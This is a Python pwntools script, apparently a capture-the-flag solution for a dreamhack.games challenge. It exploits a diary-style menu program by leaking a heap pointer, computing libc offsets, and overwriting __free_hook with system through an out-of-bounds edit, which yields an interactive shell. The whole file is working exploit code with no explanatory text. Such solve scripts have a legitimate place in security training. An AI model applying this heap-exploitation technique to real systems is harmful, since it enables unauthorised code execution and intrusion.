from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = '0.0.0.0', 31338
HOST, PORT = 'host3.dreamhack.games', 23056
r = remote(HOST, PORT)

def write(date, line, data):
    r.sendlineafter(b'>> ', b'1')
    r.sendlineafter(b': ', b'%d'%date)
    r.sendlineafter(b': ', b'%d'%line)
    r.sendafter(b'~\n', data)

def read(date):
    r.sendlineafter(b'>> ', b'2')
    r.sendlineafter(b': ', b'%d'%date)

def sleep(date, line, data):
    r.sendlineafter(b'>> ', b'3')
    r.sendlineafter(b'? : ', b'%d'%date)
    r.sendlineafter(b'edit : ', b'%d'%line)
    r.sendafter(b': ', data)

for i in range(1, 25):
    write(i, 1, b'A')

write(25, 0x21000, b'/bin/sh\x00')
read(25)
r.recvuntil(b': ')
ptr = int(r.recvline().strip(), 16)
libc = ptr + 0x210ff0
system = libc+0x4f420
free_hook = libc + 0x3ed8e8

# target = ptr + 16(line - 1)
l = ((free_hook - ptr) // 16) + 1

sleep(25, l, p64(0) + p64(system))

r.interactive()